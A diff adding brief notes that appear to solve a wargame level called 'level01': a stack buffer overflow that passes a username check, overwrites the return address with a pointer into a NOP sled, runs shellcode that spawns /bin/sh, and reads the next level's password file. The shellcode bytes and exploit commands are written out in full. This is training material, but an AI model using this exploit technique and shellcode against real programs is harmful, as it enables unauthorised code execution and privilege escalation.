@@ -1,0 +1,15 @@
+- we can overflow str to overwrite main return address
+- we first need to fulfil the verify_user_name condition with the string "dat_wil" and then we can build our buffer
+overflow on str
+
+- we must fill 64 bytes of str, 4 bytes for cmp, 8 bytes (as shown in gcc) for saved registers and stack alignment and
+4 byte for the saved ebp of stack frame
+- we will store our shellcode in an environment variable with, as usual, some NOP instructions prepended to it and
+we will put an address in the approximative middle of this NOP field in place of the main return address
+
+- we are now able to build our exploit
+	- export EXPLOIT=$(ruby -e 'print "\x90" * 128 +
+	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"')
+	- env_checker EXPLOIT 128 -> 0xffffd8a2
+	- (ruby -e 'print "dat_wil\n" + "x" * (64 + 4 + 8 + 4) + "\xa2\xd8\xff\xff"'; cat) | ./level01
+	- cat /home/users/level02/.pass
